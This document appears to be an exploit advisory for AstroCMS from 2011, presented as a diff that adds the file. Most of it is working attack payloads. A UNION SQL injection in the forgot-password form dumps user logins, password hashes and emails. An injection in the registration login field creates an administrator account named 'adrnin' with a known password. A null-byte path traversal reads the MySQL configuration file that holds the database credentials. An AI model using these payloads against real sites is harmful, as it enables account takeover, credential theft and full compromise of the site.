@@ -1,0 +1,36 @@
+# Exploit Title: AstroCMS Multiple Remote Vulnerabilities
+# Google Dork: none
+# Date: 12.03.2011
+# Author: brain[pillow]
+# Software Link: http://www.astrocms.com/
+# Version: UNKNOWN
+
+============================================================
+FORGOT_PASSWORD SQL-INJ EXPLOIT:
+============================================================
+
+ /registration/forgot/
+
+ a' union select 0,0,0,0,concat_ws(0x3a,login,password,email,status ,level),0,0,0,0,0,0,0 from auth_users where id=5#
+
+id=6 - usually admin
+
+============================================================
+REGISTER_USER EXPLOIT:
+============================================================
+ /registration/
+
+adrnin','4297f44b13955235245b2497399d7a93','adrnin ','okk@mail.com',1,5,'','','')#
+
+Submitting this to "login field" will add "adrnin" user with admin rights and password "123123".
+Usually 5 - is admin group.
+
+============================================================
+READ FILE EXPLOIT:
+============================================================
+
+ /include/get_js.php4?fname=../htdocs/include/config_mysql.inc%00.js
+
+OR:
+
+ /include/get_js.php?fname=../htdocs/include/config_mysql.inc%00.js
